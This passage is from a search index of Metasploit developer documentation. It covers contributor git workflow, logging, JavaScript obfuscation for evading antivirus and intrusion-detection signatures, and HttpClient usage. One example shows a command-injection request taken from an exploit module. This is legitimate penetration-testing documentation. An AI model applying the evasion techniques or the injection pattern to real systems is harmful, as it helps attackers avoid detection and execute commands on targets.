master branch. Why? Because when you do a msfupdate, which is Metasploit’s utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you’re submitting other crap you don’t intend to change, and/or you’re probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that’s up to date to master. First off, make sure you’re on master. If you do a git status it will tell you what branch you’re currently on: . $ git status # On branch upstream-master nothing to commit, working directory clean . Ok, now do a git pull to download the latest changes from Metasploit: . $ git pull Already up-to-date. At this point, you’re ready to start a new branch. In this case, we’ll name our new branch “my_awesome_branch”: . $ git checkout -b my_awesome_module Switched to a new branch 'my_awesome_module' . And then you can go ahead and add that module. Make sure it’s in the appropriate path: . $ git add [module path] . When you decide to save the changes, commit (if there’s only one module, you can do git commit -a too so you don’t have to type the module path. Note -a really means EVERYTHING): . $ git commit [module path] . When you’re done, push your changes, which will upload your code to your remote branch “my_awesome_branch”. You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch . ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#templates",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#templates"
  },"191": {
    "doc": "Writing an auxiliary module",
    "title": "References",
    "content": ". | https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary.rb | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/scanner.rb | . ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#references",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html#references"
  },"192": {
    "doc": "Writing an auxiliary module",
    "title": "Writing an auxiliary module",
    "content": "Metasploit is known for its free, open-source exploits - modules that pop shells. But in reality, penetration testers rely more on auxiliary modules, and often a successful pentest can be done without firing a single exploit. They’re just more handy, and the punishment for a failed attempt is generally much lower. Professionals actually love auxiliary modules. Another interesting fact about auxiliary modules is that some of them aren’t so different from being exploits. The main difference is how it’s defined in Metasploit: if a module executes a payload, it’s an exploit. If not, even though it takes advantage of a vulnerability, it still belongs to the auxiliary category. If an auxiliary module is capable of running an Operating System command, it could be made into an exploit by delivering a cmd* payload and/or using a command stager. So you see, if you’re an auxiliary module addict, you are on the right track. ",
    "url": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html",
    "relUrl": "/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html"
  },"193": {
    "doc": "Logging",
    "title": "Basic Usage",
    "content": "As an user, you should know that all the logged errors are saved in a file named framework.log. The save path is defined in Msf::Config.log_directory, which means in msfconsole, you can switch to irb and figure out where it is: . msf &gt; irb [*] Starting IRB shell... &gt;&gt; Msf::Config.log_directory =&gt; \"/Users/test/.msf4/logs\" . By default, all the log errors are on level 0 - the least informative level. But of course, you can change this by setting the datastore option, like this: . msf &gt; setg LogLevel 3 LogLevel =&gt; 3 msf &gt; . ",
    "url": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#basic-usage",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#basic-usage"
  },"194": {
    "doc": "Logging",
    "title": "Log Levels",
    "content": "There are 4 different logging levels defined in log/rex/logging.rb: . | Log Level | Description | . | LEV_0 (Default) | The default log level if none is specified. It should be used when a log message should always be displayed when logging is enabled. Very few log messages should occur at this level aside from necessary information logging and error/warning logging. Debug logging at level zero is not advised. | . | LEV_1 (Extra) | This log level should be used when extra information may be needed to understand the cause of an error or warning message or to get debugging information that might give clues as to why something is happening. This log level should be used only when information may be useful to understanding the behavior of something at a basic level. This log level should not be used in an exhaustively verbose fashion. | . | LEV_2 (Verbose) | This log level should be used when verbose information may be needed to analyze the behavior of the framework. This should be the default log level for all detailed information not falling into LEV_0 or LEV_1. It is recommended that this log level be used by default if you are unsure. | . | LEV_3 (Insanity) | This log level should contain very verbose information about the behavior of the framework, such as detailed information about variable states at certain phases including, but not limited to, loop iterations, function calls, and so on. This log level will rarely be displayed, but when it is the information provided should make it easy to analyze any problem. | . For debugging purposes, it’s always better to turn on the highest level of logging. ",
    "url": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#log-levels",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#log-levels"
  },"195": {
    "doc": "Logging",
    "title": "Logging API",
    "content": "There are mainly five logging methods you will most likely be using a lot, and they all have the exact same arguments. Let’s use one of the logging methods to explain what these arguments are about: . def elog(msg, src = 'core', level = 0, from = caller) . | msg - The message you want to log | src - The source of the error (default is core, as in Metasploit core) | level - The log level | from - The current execution stack. caller is a method from Kernel. | . Notice that only the msg argument is required, the rest are optional. Now, let’s go over these five methods and explain how they’re meant to be used: . | Method | Purpose | . | dlog() | LOG_DEBUG | . | elog() | LOG_ERROR | . | wlog() | LOG_WARN | . | ilog() | LOG_INFO | . | rlog() | LOG_RAW | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#logging-api",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#logging-api"
  },"196": {
    "doc": "Logging",
    "title": "Code Example",
    "content": "elog(\"The sky has fallen\") . ",
    "url": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#code-example",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html#code-example"
  },"197": {
    "doc": "Logging",
    "title": "Logging",
    "content": "Usually, if something in Metasploit triggers an error, there is a backtrace or at least a brief message that explains what the problem is about. Most of the time, there is nothing wrong with that. But sometimes if you wish to report that problem, you might lose that information, which makes your bug report less informative, and the problem may take much longer to solve. This is why logging to file in many cases is extremely useful. In this documentation, we’ll explain about how to take advantage of this properly. ",
    "url": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html"
  },"198": {
    "doc": "JavaScript Obfuscation",
    "title": "The rand_text_alpha trick",
    "content": "Using rand_text_alpha is the most basic form of evasion, but also the least effective. If this is your choice, you should randomize whatever can be randomized without breaking the code. By using the above MS12-063, here’s how you would use rand_text_alpha: . # Randomizes the array variable # Max size = 6, Min = 3 var_array = rand_text_alpha(rand(6) + 3) # Randomizes the src value val_src = rand_text_alpha(1) js = %Q| var #{var_array} = new Array(); #{var_array}[0] = windows.document.createElement(\"img\"); #{var_array}[0][\"src\"] = \"#{val_src}\"; | . ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html#the-rand_text_alpha-trick",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html#the-rand_text_alpha-trick"
  },"199": {
    "doc": "JavaScript Obfuscation",
    "title": "The ObfuscateJS class",
    "content": "The ObfuscateJS class is like the rand_text_alpha technique on steroids, but even better. It allows you to replace symbol names such as variables, methods, classes, and namespaces. It can also obfuscate strings by either randomly using fromCharCode or unescape. And lastly, it can strip JavaScript comments, which is handy because exploits often are hard to understand and read so you need comments to remember why something is written in a specific way, but you don’t want to show or leak those comments in a pentest. To use ObfuscateJS, let’s use the MS12-063 example again to demonstrate. If you feel like following the steps yourself without writing a module, what you can do is go ahead and run msfconsole, and then switch to irb, like this: . $ ./msfconsole -q msf &gt; irb [*] Starting IRB shell... &gt;&gt; . And then you are ready to go. The first thing you do with ObfuscateJS is you need to initialize it with the JavaScript you want to obfuscate, so in this case, begin like the following: . js = %Q| var arrr = new Array(); arrr[0] = windows.document.createElement(\"img\"); arrr[0][\"src\"] = \"a\"; | obfu = ::Rex::Exploitation::ObfuscateJS.new(js) . obfu should return a Rex::Exploitation::ObfuscateJS object. It allows you to do a lot of things, you can really just call methods, or look at the source to see what methods are available (with additional API documentation). But for demo purposes, we’ll showcase the most common one: the obfuscate method. To actually obfuscate, you need to call the obfuscate method. This method accepts a symbols argument that allows you to manually specify what symbol names (variables, methods, classes, etc) to obfuscate, it should be in a hash like this: . { 'Variables' =&gt; [ 'var1', ... ], 'Methods' =&gt; [ 'method1', ... ], 'Namespaces' =&gt; [ 'n', ... ], 'Classes' =&gt; [ { 'Namespace' =&gt; 'n', 'Class' =&gt; 'y'}, ... ] } . So if I want to obfuscate the variable arrr, and I want to obfuscate the src string, here’s how: . &gt;&gt; obfu.obfuscate('Symbols' =&gt; {'Variables'=&gt;['arrr']}, 'Strings' =&gt; true) =&gt; \"\\nvar QqLFS = new Array();\\nQqLFS[0] = windows.document.createElement(unescape(String.fromCharCode( 37, 54, 071, 045, 0x36, 0144, 37, 066, 067 )));\\nQqLFS[0][String.fromCharCode( 115, 0x72, 0143 )] = unescape(String.fromCharCode( 045, 0x36, 0x31 ));\\n\" . In some cases, you might actually want to know the obfuscated version of a symbol name. One scenario is calling a JavaScript function from an element’s event handler, such as this: . &lt;html&gt; &lt;head&gt; &lt;script&gt; function test() { alert(\"hello, world!\"); } &lt;/script&gt; &lt;/head&gt; &lt;body onload=\"test();\"&gt; &lt;/body&gt; &lt;/html&gt; . The obfuscated version would look like the following: . js = %Q| function test() { alert(\"hello, world!\"); } | obfu = ::Rex::Exploitation::ObfuscateJS.new(js) obfu.obfuscate('Symbols' =&gt; {'Methods'=&gt;['test']}, 'Strings' =&gt; true) html = %Q| &lt;html&gt; &lt;head&gt; &lt;script&gt; #{js} &lt;/script&gt; &lt;/head&gt; &lt;body onload=\"#{obfu.sym('test')}();\"&gt; &lt;/body&gt; &lt;/html&gt; | puts html . ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html#the-obfuscatejs-class",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html#the-obfuscatejs-class"
  },"200": {
    "doc": "JavaScript Obfuscation",
    "title": "The JSObfu class",
    "content": "The JSObfu class used to be ObfuscateJS’ cousin, but it has been completely rewritten since September 2014, and packaged as a gem. The obfuscation is more complex and you can actually tell it to obfuscate multiple times. You also no longer have to manually specify what symbol names to change, it just knows. Trying JSObfu in Rex . Let’s get back to irb again to demonstrate how easy it is to use JSObfu: . $ ./msfconsole -q msf &gt; irb [*] Starting IRB shell... &gt;&gt; . This time we’ll do a “hello world” example: . &gt;&gt; js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| =&gt; alert('hello, world!'); &gt;&gt; js.obfuscate =&gt; nil . And here’s the output: . window[(function () { var _d=\"t\",y=\"ler\",N=\"a\"; return N+y+_d })()]((function () { var f='d!',B='orl',Q2='h',m='ello, w'; return Q2+m+B+f })()); . Like ObfuscateJS, if you need to get the randomized version of a symbol name, you can still do that. We’ll demonstrate this with the following example: . &gt;&gt; js = ::Rex::Exploitation::JSObfu.new %Q|function test() { alert(\"hello\"); }| =&gt; function test() { alert(\"hello\"); } &gt;&gt; js.obfuscate . Say we want to know the randomized version of the method name “test”: . &gt;&gt; puts js.sym(\"test\") _ . OK, double check right quick: . &gt;&gt; puts js function _(){window[(function () { var N=\"t\",r=\"r\",i=\"ale\"; return i+r+N })()](String.fromCharCode(0150,0x65,0154,0x6c,0x6f));} . Yup, that looks good to me. And finally, let’s try to obfuscate a few times to see how that goes: . &gt;&gt; js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| =&gt; alert('hello, world!'); &gt;&gt; js.obfuscate(:iterations=&gt;3) =&gt; window[String[((function(){var s=(function () { var r=\"e\"; return r })(),Q=(function () { var I=\"d\",dG=\"o\"; return dG+I })(),c=String.fromCharCode(0x66,114),w=(function () { var i=\"C\",v=\"r\",f=\"omCh\",j=\"a\"; return f+j+v+i })();return c+w+Q+s;})())](('Urx'.length*((0x1*(01*(1*020+5)+1)+3)*'u'.length+('SGgdrAJ'.length-7))+(('Iac'.length*'XLR'.length+2)*'qm'.length+0)),(('l'.length*((function () { var vZ='k'; return vZ })()[((function () { var E=\"h\",t=\"t\",O=\"leng\"; return O+t+E })())]*(0x12*1+0)+'xE'.length)+'h'.length)*(function () { var Z='uA',J='tR',D='x'; return D+J+Z })()[((function () { var m=\"th\",o=\"g\",U=\"l\",Y=\"en\"; return U+Y+o+m })())]+'lLc'.length),('mQ'.length*(02*023+2)+('Tt'.length*'OEzGiMVf'.length+5)),(String.fromCharCode(0x48,0131)[((function () { var i=\"gth\",r=\"len\"; return r+i })())]*('E'.length*0x21+19)+(0x1*'XlhgGJ'.length+4)),(String.fromCharCode(0x69)[((function () { var L=\"th\",Q=\"n\",$=\"l\",I=\"g\",x=\"e\"; return $+x+Q+I+L })())]*('QC'.length*0x2b+3)+(01*26+1)))]((function(){var C=String[((function () { var w=\"rCode\",j=\"mCha\",A=\"fr\",B=\"o\"; return A+B+j+w })())]((6*0x10+15),('riHey'.length*('NHnex'.length*0x4+2)+4),(01*95+13),(1*('Z'.length*(0x1*(01*(0x3*6+5)+1)+18)+12)+46),(0x1*(01*013+6)+16)),JQ=String[((function () { var NO=\"ode\",T=\"rC\",HT=\"fromCha\"; return HT+T+NO })())](('J'.length*0x54+17),(0x2*051+26),('TFJAGR'.length*('ymYaSJtR'.length*'gv'.length+0)+12),(01*0155+2),(0xe*'FBc'.length+2),(0x1*22+10),(3*(01*043+1)+11)),g=(function(){var N=(function () { var s='h'; return s })();return N;})();return g+JQ+C;})()); . Using JSObfu for module development . When you are writing a module, you should not call Rex directly like the above examples. Instead, you should be using the #js_obfuscate method found in JSObfu mixin. When you’re using JavaScript in your module, always do write it like this: . # This returns a Rex::Exploitation::JSObfu object js = js_obfuscate(your_code) . Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0). ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html#the-jsobfu-class",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html#the-jsobfu-class"
  },"201": {
    "doc": "JavaScript Obfuscation",
    "title": "JavaScript Obfuscation",
    "content": "Stealth is an important feature to think about during exploit development. If your exploit gets caught all the time, it doesn’t matter how awesome or how technically challenging your exploit is, it is most likely not very usable in a real penetration test. Browser exploits in particular, heavily rely on JavaScript to trigger vulnerabilities, therefore a lot of antivirus or signature-based intrusion detection/prevention systems will scan the JavaScript and flag specific lines as malicious. The following code used to be considered as MS12-063 by multiple antivirus vendors even though it is not necessarily harmful or malicious, we’ll use this as an example throughout the wiki: . var arrr = new Array(); arrr[0] = windows.document.createElement(\"img\"); arrr[0][\"src\"] = \"a\"; . To avoid getting flagged, there are some common evasive tricks we can try. For example, you can manually modify the code a little bit to make it not recognizable by any signatures. Or if the antivirus relies on cached webpages to scan for exploits, it is possible to make the browser not cache your exploit so you stay undetected. Or in this case, you can obfuscate your code, which is what this writeup will focus on. In Metasploit, there are three common ways to obfuscate your JavaScript. The first one is simply by using the rand_text_alpha method (in Rex) to randomize your variables. The second one is by using the ObfuscateJS class. And the third option is the JSObfu class. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html"
  },"202": {
    "doc": "How to parse an HTTP response",
    "title": "Getting a response",
    "content": "To get a response, you can either use Rex::Proto::Http::Client, or the HttpClient mixin to make an HTTP request. If you are writing a module, you should use the mixin. The following is an example of using the #send_request_cgi method from HttpClient: . res = send_request_cgi({'uri'=&gt;'/index.php'}) . The return value for res is a Rex::Proto::Http::Response object, but it’s also possible you get a NilClass due to a connection/response timeout. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#getting-a-response",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#getting-a-response"
  },"203": {
    "doc": "How to parse an HTTP response",
    "title": "Getting the response body",
    "content": "With a Rex::Proto::Http::Response object, here’s how you can retrieve the HTTP body: . data = res.body . If you want to get the raw HTTP response (including the response message/code, headers, body, etc), then you can simply do: . raw_res = res.to_s . However, in this documentation we are only focusing on res.body. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#getting-the-response-body",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#getting-the-response-body"
  },"204": {
    "doc": "How to parse an HTTP response",
    "title": "Choosing the right parser",
    "content": "| Format | Parser | . | HTML | Nokogiri | . | XML | Nokogiri | . | JSON | JSON | . If the format you need to parse isn’t on the list, then fall back to res.body. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#choosing-the-right-parser",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#choosing-the-right-parser"
  },"205": {
    "doc": "How to parse an HTTP response",
    "title": "Parsing HTML with Nokogiri",
    "content": "When you have a Rex::Proto::Http::Response with HTML in it, the method to call is: . html = res.get_html_document . This will give you a Nokogiri::HTML::Document, which allows you use the Nokogiri API. There are two common methods in Nokogiri to find elements: #at and #search. The main difference is that the #at method will only return the first result, while the #search will return all found results (in an array). Consider the following example as your HTML response: . &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello, World!&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"greetings\"&gt; &lt;div id=\"english\"&gt;Hello&lt;/div&gt; &lt;div id=\"spanish\"&gt;Hola&lt;/div&gt; &lt;div id=\"french\"&gt;Bonjour&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;html&gt; . Basic usage of #at . If the #at method is used to find a DIV element: . html = res.get_html_document greeting = html.at('div') . Then the greeting variable should be a Nokogiri::XML::Element object that gives us this block of HTML (again, because the #at method only returns the first result): . &lt;div class=\"greetings\"&gt; &lt;div id=\"english\"&gt;Hello&lt;/div&gt; &lt;div id=\"spanish\"&gt;Hola&lt;/div&gt; &lt;div id=\"french\"&gt;Bonjour&lt;/div&gt; &lt;/div&gt; . Grabbing an element from a specific element tree . html = res.get_html_document greeting = html.at('div//div') . Then the greeting variable should give us this block of HTML: . &lt;div id=\"english\"&gt;Hello&lt;/div&gt; . Grabbing an element with a specific attribute . Let’s say I don’t want the English Hello, I want the Spanish one. Then we can do: . html = res.get_html_document greeting = html.at('div[@id=\"spanish\"]') . Grabbing an element with a specific text . Let’s say I only know there’s a DIV element that says “Bonjour”, and I want to grab it, then I can do: . html = res.get_html_document greeting = html.at('//div[contains(text(), \"Bonjour\")]') . Or let’s say I don’t know what element the word “Bonjour” is in, then I can be a little vague about this: . html = res.get_html_document greeting = html.at('[text()*=\"Bonjour\"]') . Basic usage of #search . The #search method returns an array of elements. Let’s say we want to find all the DIV elements, then here’s how: . html = res.get_html_document divs = html.search('div') . Accessing text . When you have an element, you can always call the #text method to grab the text. For example: . html = res.get_html_document greeting = html.at('[text()*=\"Bonjour\"]') print_status(greeting.text) . The #text method can also be used as a trick to strip all the HTML tags: . html = res.get_html_document print_line(html.text) . The above will print: . \"\\n\\nHello, World!\\n\\n\\n\\nHello\\nHola\\nBonjour\\n\\n\\n\" . If you actually want to keep the HTML tags, then instead of calling #text, call #inner_html. Accessing attributes . With an element, simply call #attributes. Walking a DOM tree . Use the #next method to move on to the next element. Use the #previous method to roll back to the previous element. Use the #parent method to find the parent element. Use the #children method to get all the child elements. Use the #traverse method for complex parsing. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#parsing-html-with-nokogiri",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#parsing-html-with-nokogiri"
  },"206": {
    "doc": "How to parse an HTTP response",
    "title": "Parsing XML",
    "content": "To get the XML body from Rex::Proto::Http::Response, do: . xml = res.get_xml_document . The rest should be pretty similar to parsing HTML. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#parsing-xml",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#parsing-xml"
  },"207": {
    "doc": "How to parse an HTTP response",
    "title": "Parsing JSON",
    "content": "To get the JSON body from Rex::Proto::Http::Response, do: . json = res.get_json_document . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#parsing-json",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#parsing-json"
  },"208": {
    "doc": "How to parse an HTTP response",
    "title": "References",
    "content": ". | https://nokogiri.org/tutorials/parsing_an_html_xml_document.html | How to send an HTTP request using Rex Proto Http Client | How to Send an HTTP Request Using HttpClient | . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#references",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#references"
  },"209": {
    "doc": "How to parse an HTTP response",
    "title": "How to parse an HTTP response",
    "content": "This document talks about how to parse an HTTP response body in the cleanest way possible. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html"
  },"210": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "There are mainly two common methods you will see:",
    "content": ". | send_request_raw - You use this to send a raw HTTP request. Usually, you will want this method if you need something that violates the specification; in most other cases, you should prefer send_request_cgi. If you wish to learn about how this method works, look at the documentation for Rex::Proto::Http::Client#request_raw. | . Here’s a basic example of how to use send_request_raw: . send_request_raw({'uri'=&gt;'/index.php'}) . | send_request_cgi - You use this to send a more CGI-compatible HTTP request. If your request contains a query string (or POST data), then you should use this. If you wish to learn about how this method works, check out Rex::Proto::Http::Client#request_cgi. | . Here’s a very basic example for send_request_cgi: . send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; '/hello_world.php', 'vars_get' =&gt; { 'param_1' =&gt; 'abc', 'param_2' =&gt; '123' } }) . Please note: send_request_raw and send_request_cgi will return a nil if there’s a timeout, so please make sure to account for that condition when you handle the return value. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#there-are-mainly-two-common-methods-you-will-see",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#there-are-mainly-two-common-methods-you-will-see"
  },"211": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "Cookies &amp; CookieJars",
    "content": "Part of send_request_cgi functionality is the ability to collect, edit, and send cookies via the HttpClient’s cookie_jar variable, an instance of the HttpCookieJar class. A HttpCookieJar is a collection of HttpCookie. The Jar can be populated manually with it’s add method, or automatically via the keep_cookies option that can be passed to send_request_cgi. If you need to clear the cookie jar (for instance, using a 2nd login), try: . cookie_jar.clear . keep_cookies option . Shown below is the request used to login to a gitlab account in the gitlab_file_read_rce exploit module . res = @http_client.send_request_cgi({ 'method' =&gt; 'POST', 'uri' =&gt; '/users/sign_in', 'keep_cookies' =&gt; true, 'vars_post' =&gt; { 'utf8' =&gt; '✓', 'authenticity_token' =&gt; csrf_token, 'user[login]' =&gt; username, 'user[password]' =&gt; password, 'user[remember_me]' =&gt; 0 } }) . The cookies returned by the server with a successful login need to be attached to all future requests, so 'keep_cookies' =&gt; true, is used to add all returned cookies to the HttpClient CookieJar and attach them to all subsequent requests. cookie option . Shown below is the request used to login to a gitlab account in the artical_proxy_auth_bypass_service_cmds_peform_command_injection module . artical_proxy_auth_bypass_service_cmds_peform_command_injection requires a specific cookie header to be sent with a request in order to achieve RCE. By setting a string of the desired header as the value of the cookie option, that string is set as the cookie header without any changes, allowing the exploit to be carried out. res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; normalize_uri(target_uri.path, 'cyrus.index.php'), 'vars_get' =&gt; { 'service-cmds-peform' =&gt; \"||#{Rex::Text.uri_encode(cmd, 'hex-all')}||\" }, 'cookie' =&gt; \"PHPSESSID=#{@phpsessid}; AsWebStatisticsCooKie=1; shellinaboxCooKie=1\" }) . Any object passed to cookie that isn’t an instance of HttpCookieJar will have to_s called on it. The result of to_s will be set as the cookie header of the http request. The contents of the HttpClient cookie_jar is ignored only this request. Subsequent requests are unaffected. Module authors can also pass an instance of HttpCookieJar with the cookie option: . cj = Msf::Exploit::Remote::HTTP::HttpCookieJar.new cj.add(Msf::Exploit::Remote::HTTP::HttpCookie.new('PHPSESSID', @phpsessid)) cj.add(Msf::Exploit::Remote::HTTP::HttpCookie.new('AsWebStatisticsCooKie', 1)) cj.add(Msf::Exploit::Remote::HTTP::HttpCookie.new('shellinaboxCooKie', 1)) res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; normalize_uri(target_uri.path, 'cyrus.index.php'), 'vars_get' =&gt; { 'service-cmds-peform' =&gt; \"||#{Rex::Text.uri_encode(cmd, 'hex-all')}||\" }, 'cookie' =&gt; cj }) . The above code would create an identical cookie header to the one used in the previous example, save for a random ordering of the name value pairs. This shouldn’t affect how the server would read the cookies, but it’s still worth keeping in mind if you’ve somehow found a vuln reliant on the order of cookies in a header. expire_cookies . send_request_cgi will call cleanup on cookie_jar before iot is used to populate a request with cookies. cleanup will remove any expired cookies permenetly from the jar, affecting all future requests. If this behaviour isn’t deisred and an author would prefer to keep expired cookies in the jar, the expire_cookies option can be set to false: . res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; normalize_uri(target_uri.path, 'cyrus.index.php'), 'vars_get' =&gt; { 'service-cmds-peform' =&gt; \"||#{Rex::Text.uri_encode(cmd, 'hex-all')}||\" }, 'cookie' =&gt; \"PHPSESSID=#{@phpsessid}; AsWebStatisticsCooKie=1; shellinaboxCooKie=1\", 'expire_cookies' =&gt; false }) . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#cookies--cookiejars",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#cookies--cookiejars"
  },"212": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "URI Parsing",
    "content": "Before you send a HTTP request, you will most likely have to do some URI parsing. This is a tricky task, because sometimes when you join paths, you may accidentally get double slashes, like this: “/test//index.php”. Or for some reason you have a missing slash. These are really commonly made mistakes. So here’s how you can handle it safely: . 1 - Register your default URI datastore option as ‘TARGETURI’: . Example: . register_options( [ OptString.new('TARGETURI', [true, 'The base path to XXX application', '/xxx_v1/']) ] ) . 2 - Load your TARGETURI with target_uri, that way the URI input validation will kick in, and then you get a real URI object: . In this example, we’ll just load the path: . uri = target_uri.path . 3 - When you want to join another URI, always use normalize_uri: . Example: . # Returns: \"/xxx_v1/admin/upload.php\" uri = normalize_uri(uri, 'admin', 'upload.php') . 4 - When you’re done normalizing the URI, you’re ready to use send_request_cgi or send_request_raw . Please note: The normalize_uri method will always follow these rules: . | The URI should always begin with a slash. | You will have to decide if you need the trailing slash or not. | There should be no double slashes. | . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#uri-parsing",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#uri-parsing"
  },"213": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "Full Example",
    "content": "require 'msf/core' class MetasploitModule &lt; Msf::Auxiliary include Msf::Exploit::Remote::HttpClient def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'HttpClient Example', 'Description' =&gt; %q{ Do a send_request_cgi() }, 'Author' =&gt; [ 'sinn3r' ], 'License' =&gt; MSF_LICENSE ) ) register_options( [ OptString.new('TARGETURI', [true, 'The base path', '/']) ] ) end def run uri = target_uri.path res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; normalize_uri(uri, 'admin', 'index.php'), 'vars_get' =&gt; { 'p1' =&gt; 'This is param 1', 'p2' =&gt; 'This is param 2' } }) if res &amp;&amp; res.code == 200 print_good('I got a 200, awesome') else print_error('No 200, feeling blue') end end end . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#full-example",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#full-example"
  },"214": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "Working with Burp Suite",
    "content": "Burp Suite is a useful tool to examine or modify HTTPS traffic while developing a module using HttpClient. To do this: . | Start Burp: java -jar burpsuite.jar | In Burp, click on the Proxies tab, and then Options. Configure the proxy listener there. In this example, let’s say we have a listener on port 6666. | Once the Burp listener is up, start msfconsole and load the module you’re working on. | Enter: set Proxies HTTP:127.0.0.1:6666 | Go ahead and run the module, Burp should intercept the HTTPS traffic. | . Note that Burp only supports HTTPS for HttpClient. This problem is only specific to Burp and Metasploit. If you need to examine HTTP traffic for HttpClient, a workaround is adding the following method in your module. This will override HttpClient’s send_request_* method, and return the modified output: . def send_request_cgi(opts) res = super(opts) puts res.request.to_s puts puts res.to_s puts puts end . You can do the same for send_request_raw as well. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#working-with-burp-suite",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#working-with-burp-suite"
  },"215": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "Other Common questions:",
